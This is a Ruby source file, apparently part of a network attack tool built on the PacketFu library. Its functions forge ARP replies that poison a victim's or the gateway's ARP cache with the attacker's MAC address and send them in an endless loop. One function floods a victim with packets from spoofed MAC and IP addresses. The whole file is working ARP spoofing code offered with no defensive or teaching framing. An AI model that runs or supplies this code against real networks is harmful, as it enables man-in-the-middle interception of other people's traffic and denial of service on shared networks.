def packet_craft(saddr, daddr, saddr_ip, daddr_ip, client_ip, delay, interface)
 
  @arp_packet_victim = PacketFu::ARPPacket.new()
  @arp_packet_victim.eth_saddr = saddr
  @arp_packet_victim.eth_daddr = daddr
  @arp_packet_victim.arp_saddr_mac = saddr
  @arp_packet_victim.arp_daddr_mac = daddr
  @arp_packet_victim.arp_saddr_ip = saddr_ip
  @arp_packet_victim.arp_daddr_ip = daddr_ip
  @arp_packet_victim.arp_opcode = 1
  @arp_packet_victim
  
end

def send_packet(delay, interface, crafted_packet)
  @i = 0
    
  Thread.new do
    while true
      print "\r The ARP packet has been sent successfully #{@i} times"
    end
  end

  while true
    @i += 1
    crafted_packet.to_w(interface)
    sleep delay
  end
end

def client_attack(delay, interface, client_ip, source_mac = nil)
  gw_ip = `netstat -rn | grep 0.0.0.0 | awk '{print $2}' | grep -v "0.0.0.0"`
  client_mac = PacketFu::Utils::arp(client_ip, :iface => interface)

  source_mac.nil? ? saddr = self_mac(interface) : saddr = source_mac
  daddr = client_mac
  saddr_ip = gw_ip
  daddr_ip = client_ip
  crafted_packet = packet_craft(saddr, daddr, saddr_ip, daddr_ip, daddr_ip, delay, interface)
  send_packet(delay, interface, crafted_packet)
end

def gateway_attack(delay, interface, client_ip, source_mac = nil)
  gw_ip = `netstat -rn | grep 0.0.0.0 | awk '{print $2}' | grep -v "0.0.0.0"`
  gw_mac = PacketFu::Utils::arp(gw_ip, :iface => interface)

  source_mac.nil? ? saddr = self_mac(interface) : saddr = source_mac
  daddr = gw_mac
  saddr_ip = client_ip
  daddr_ip = gw_ip

  crafted_packet = packet_craft(saddr, daddr, saddr_ip, daddr_ip, saddr_ip, delay, interface)
  send_packet(delay, interface, crafted_packet)
end
  
def ntoa_attack(delay, interface, victim_ip)
  victim_mac = PacketFu::Utils::arp(victim_ip, :iface => interface)
  @a = 10
  @b = 10
  @c = 10
  @i = 0
  saddr = "00:03:FF:#{@a}:#{@b}:#{@c}"
  daddr = victim_mac
  saddr_ip = "10.188.#{@b}.#{@c}"
  daddr_ip =  victim_ip
  crafted_packet = packet_craft(saddr, daddr, saddr_ip, daddr_ip, victim_ip, delay, interface)
  while true
    while @a < 100 do
      @b = 10
      @a += 1
      while @b < 100 && @a < 100 do
        @c = 10
        @b += 1
        while @c < 100 && @b < 100 do
          @c += 1
          crafted_packet.eth_saddr =  "00:03:FF:#{@a}:#{@b}:#{@c}"
          crafted_packet.arp_saddr_mac = "#00:03:FF:#{@a}:#{@b}:#{@c}"
          crafted_packet.arp_saddr_ip = "10.188.#{(@b - 10) }.#{(@c - 10)}"
          crafted_packet.to_w(interface)
          @i += 1
          print "\r The ARP packet has been sent successfully #{@i} times"
          sleep delay
        end
      end
    end
  end
end

def self_mac(interface)
  `ifconfig | grep '#{interface}' | tr -s ' ' | cut -d ' ' -f5`
end